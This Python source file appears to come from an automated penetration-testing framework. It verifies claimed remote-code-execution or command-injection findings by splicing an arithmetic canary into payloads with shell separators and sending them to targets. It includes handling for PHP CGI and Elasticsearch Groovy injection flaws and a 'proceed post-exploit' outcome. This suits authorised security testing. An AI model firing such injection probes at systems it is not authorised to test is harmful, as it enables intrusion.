import secrets
import re
import json
import httpx
from typing import Tuple, Dict, Optional
from veripen.oracles.base_oracle import BaseOracle
from veripen.core.schemas import (
    ExploitClaim,
    FailureDiagnostic,
    VerificationStatus,
    RecommendedAction,
    InjectionPoint
)


# Nonce bit-length. Must be >= 32 for the soundness bound in Proposition 1.
# N = 48 gives epsilon ~= 3.55e-10 per probe (L = 1e5 bytes).
NONCE_BITS = 48
NONCE_MIN = 1 << (NONCE_BITS - 1)      # 2^47
NONCE_MAX = (1 << NONCE_BITS) - 1      # 2^48 - 1


def _looks_like_groovy_script(text: str) -> bool:
    """Heuristic: is this a bare Groovy script (no JSON wrapper)?"""
    s = text.strip()
    if s.startswith("{"):
        return False
    return ".exec(" in s or "getText()" in s or "getRuntime()" in s


class _CurlResponse:
    """Minimal shim so curl-based responses match the httpx.Response interface
    used by the oracle (`.text` and `.status_code`)."""
    def __init__(self, status_code: int, text: str):
        self.status_code = status_code
        self.text = text


class CanaryRCEOracle(BaseOracle):
    """
    Deterministic Verification Oracle for Remote Code Execution / Command Injection.
    Eliminates echo-hallucinations via dynamic arithmetic and nonce challenges.

    Decision logic (matches Proposition 1 of the thesis formal model):
      - VERIFIED      if str(S) appears as a standalone token in the response
      - ECHO_ONLY     if X or Y appears but S does not (reflection, no execution)
      - ABSENT        otherwise (no proof, no reflection)
    """

    def __init__(self, timeout_seconds: float = 8.0):
        super().__init__(oracle_name="CanaryRCEOracle", timeout_seconds=timeout_seconds)

    # ------------------------------------------------------------------ #
    # Nonce generation (Assumption A1: CSPRNG, uniform over [2^47, 2^48))
    # ------------------------------------------------------------------ #
    def _generate_arithmetic_challenge(self) -> Tuple[int, int, int]:
        span = NONCE_MAX - NONCE_MIN + 1
        val1 = NONCE_MIN + secrets.randbelow(span)
        val2 = NONCE_MIN + secrets.randbelow(span)
        return val1, val2, val1 + val2

    # ------------------------------------------------------------------ #
    # Payload synthesis
    # ------------------------------------------------------------------ #
    def _synthesize_canary_payload(self, base_payload: str, val1: int, val2: int) -> str:
        proof_cmd = f"expr {val1} + {val2}"

        # Case A: explicit placeholder in the template
        if "{CMD}" in base_payload:
            return base_payload.replace("{CMD}", proof_cmd)

        # Case B: template ends with "=" -- the sink is the last field value.
        if base_payload.endswith("="):
            return f"{base_payload}{proof_cmd}"

        # Case C: shell-style concatenation
        if ";" in base_payload:
            return f"{base_payload}; {proof_cmd}"
        elif "&&" in base_payload:
            return f"{base_payload} && {proof_cmd}"
        elif "|" in base_payload:
            return f"{base_payload} | {proof_cmd}"
        elif "$(" in base_payload or "`" in base_payload:
            return f"$({proof_cmd})"

        # Case D: default
        return f"{base_payload}; {proof_cmd}"

    # ------------------------------------------------------------------ #
    # Payload -> form-field parsing
    # ------------------------------------------------------------------ #
    def _parse_payload_to_fields(
        self, payload: str, default_first_key: Optional[str] = None
    ) -> Dict[str, str]:
        if "&" not in payload:
            return {}
        segments = payload.split("&")
        fields: Dict[str, str] = {}
        for i, pair in enumerate(segments):
            if "=" in pair:
                k, v = pair.split("=", 1)
                fields[k] = v
            elif i == 0 and default_first_key:
                fields[default_first_key] = pair
        return fields

    # ------------------------------------------------------------------ #
    # Response normalization
    # ------------------------------------------------------------------ #
    @staticmethod
    def _normalize_response(raw: str) -> str:
        text = raw
        ansi = re.compile(r"\x1B\[[0-?]*[ -/]*[@-~]")
        text = ansi.sub("", text)
        try:
            from urllib.parse import unquote
            text = unquote(text)
        except Exception:
            pass
        return text

    # ------------------------------------------------------------------ #
    # HEADER injection via curl
    # ------------------------------------------------------------------ #
    async def _dispatch_header_via_curl(
        self,
        claim: ExploitClaim,
        canary_payload: str,
        headers: Dict[str, str],
    ) -> _CurlResponse:
        import asyncio as _asyncio

        header_name = claim.parameter_name or "X-Command"
        args = [
            "curl", "-s", "-i", "-X", "POST",
            claim.target_url,
            "-H", f"{header_name}: {canary_payload}",
        ]
        for k, v in headers.items():
            if k.lower() == header_name.lower():
                continue
            if k.lower() == "content-type":
                continue
            args.extend(["-H", f"{k}: {v}"])

        proc = await _asyncio.create_subprocess_exec(
            *args,
            stdout=_asyncio.subprocess.PIPE,
            stderr=_asyncio.subprocess.PIPE,
        )
        stdout, stderr = await proc.communicate()
        raw_response = stdout.decode("utf-8", errors="replace")

        status_code = 200
        body = raw_response
        if raw_response.startswith("HTTP/"):
            parts = raw_response.split("\r\n\r\n", 1)
            if len(parts) == 2:
                header_block, body = parts
                first_line = header_block.split("\r\n", 1)[0]
                tokens = first_line.split()
                if len(tokens) >= 2:
                    try:
                        status_code = int(tokens[1])
                    except ValueError:
                        pass

        return _CurlResponse(status_code=status_code, text=body)

    # ------------------------------------------------------------------ #
    # HTTP dispatch
    # ------------------------------------------------------------------ #
    async def _dispatch(
        self,
        client: httpx.AsyncClient,
        claim: ExploitClaim,
        canary_payload: str,
        headers: Dict[str, str],
    ):
        """Send the probe according to the claim's injection point."""

        if claim.injection_point == InjectionPoint.GET_PARAM:
            params = {claim.parameter_name or "cmd": canary_payload}
            return await client.get(claim.target_url, params=params, headers=headers)

        if claim.injection_point == InjectionPoint.POST_BODY:
            # Raw PHP code body (CVE-2012-1823 style).
            if canary_payload.strip().startswith("<?php"):
                return await client.post(
                    claim.target_url,
                    content=canary_payload.encode("utf-8"),
                    headers={**headers, "Content-Type": "application/x-www-form-urlencoded"},
                )
            # ThinkPHP-style multi-field primitives.
            fields = self._parse_payload_to_fields(
                canary_payload, default_first_key=claim.parameter_name
            )
            if fields:
                return await client.post(claim.target_url, data=fields, headers=headers)
            data = {claim.parameter_name or "cmd": canary_payload}
            return await client.post(claim.target_url, data=data, headers=headers)

        if claim.injection_point == InjectionPoint.JSON_FIELD:
            stripped = canary_payload.strip()

            # Case 1: full JSON document -- send raw.
            if stripped.startswith("{"):
                return await client.post(
                    claim.target_url,
                    content=stripped.encode("utf-8"),
                    headers={**headers, "Content-Type": "application/json"},
                )

            # Case 2: bare Groovy expression (Elasticsearch CVE-2015-1427).
            # Wrap it in the JSON envelope the target expects.
            if _looks_like_groovy_script(stripped):
                envelope = {
                    "size": 1,
                    "script_fields": {
                        "proof": {
                            "lang": "groovy",
                            "script": stripped,
                        }
                    },
                }
                return await client.post(
                    claim.target_url,
                    content=json.dumps(envelope).encode("utf-8"),
                    headers={**headers, "Content-Type": "application/json"},
                )

            # Case 3: wrap as a single JSON field.
            json_data = {claim.parameter_name or "cmd": canary_payload}
            return await client.post(claim.target_url, json=json_data, headers=headers)

        if claim.injection_point == InjectionPoint.HEADER:
            return await self._dispatch_header_via_curl(claim, canary_payload, headers)

        raise ValueError(f"Unsupported injection point: {claim.injection_point}")

    # ------------------------------------------------------------------ #
    # Main entry point
    # ------------------------------------------------------------------ #
    async def verify(self, claim: ExploitClaim) -> FailureDiagnostic:
        val1, val2, expected_sum = self._generate_arithmetic_challenge()
        canary_payload = self._synthesize_canary_payload(
            claim.candidate_payload, val1, val2
        )
        expected_str = str(expected_sum)
        literal_pattern = f"expr {val1} + {val2}"
        canary_id = f"{val1},{val2},{expected_sum}"

        headers = dict(claim.headers)
        headers.setdefault("Cache-Control", "no-cache, no-store, must-revalidate")
        headers.setdefault("Pragma", "no-cache")

        try:
            async with httpx.AsyncClient(
                timeout=self.timeout_seconds, verify=False
            ) as client:
                try:
                    response = await self._dispatch(
                        client, claim, canary_payload, headers
                    )
                except ValueError as ve:
                    return FailureDiagnostic(
                        status=VerificationStatus.ERROR,
                        oracle_name=self.oracle_name,
                        rejection_code="UNSUPPORTED_INJECTION_POINT",
                        raw_observation=str(ve),
                        recommended_action=RecommendedAction.TRY_ALTERNATIVE_VECTOR,
                    )

            body = self._normalize_response(response.text)
            sum_match = re.search(r"\b" + re.escape(expected_str) + r"\b", body)
            echo_x = re.search(r"\b" + re.escape(str(val1)) + r"\b", body) is not None
            echo_y = re.search(r"\b" + re.escape(str(val2)) + r"\b", body) is not None
            literal_match = literal_pattern in body
            any_echo = echo_x or echo_y or literal_match

            if sum_match:
                return FailureDiagnostic(
                    status=VerificationStatus.VERIFIED,
                    oracle_name=self.oracle_name,
                    rejection_code="PROVEN_EXECUTION",
                    raw_observation=(
                        f"Canary proof evaluated on target CPU. "
                        f"Expected {expected_str} found in response body."
                    ),
                    recommended_action=RecommendedAction.PROCEED_POST_EXPLOIT,
                    mutated_canary=canary_id,
                )

            if any_echo:
                return FailureDiagnostic(
                    status=VerificationStatus.REJECTED,
                    oracle_name=self.oracle_name,
                    rejection_code="CANARY_ECHO_ONLY",
                    raw_observation=(
                        f"Target reflected payload tokens (X_seen={echo_x}, "
                        f"Y_seen={echo_y}) without shell evaluation."
                    ),
                    recommended_action=RecommendedAction.MUTATE_ENCODING,
                    mutated_canary=canary_id,
                )

            return FailureDiagnostic(
                status=VerificationStatus.REJECTED,
                oracle_name=self.oracle_name,
                rejection_code="CANARY_ABSENT",
                raw_observation=(
                    f"Neither execution proof ({expected_str}) nor reflection "
                    f"detected. HTTP Status: {response.status_code}."
                ),
                recommended_action=RecommendedAction.BACKTRACK_BRANCH,
                mutated_canary=canary_id,
            )

        except httpx.TimeoutException:
            return FailureDiagnostic(
                status=VerificationStatus.REJECTED,
                oracle_name=self.oracle_name,
                rejection_code="PROBE_TIMEOUT",
                raw_observation=(
                    f"Target connection timed out after {self.timeout_seconds}s."
                ),
                recommended_action=RecommendedAction.BACKTRACK_BRANCH,
                mutated_canary=canary_id,
            )
        except Exception as e:
            return FailureDiagnostic(
                status=VerificationStatus.ERROR,
                oracle_name=self.oracle_name,
                rejection_code="CONNECTION_FAILURE",
                raw_observation=f"Oracle network error: {str(e)}",
                recommended_action=RecommendedAction.BACKTRACK_BRANCH,
                mutated_canary=canary_id,
            )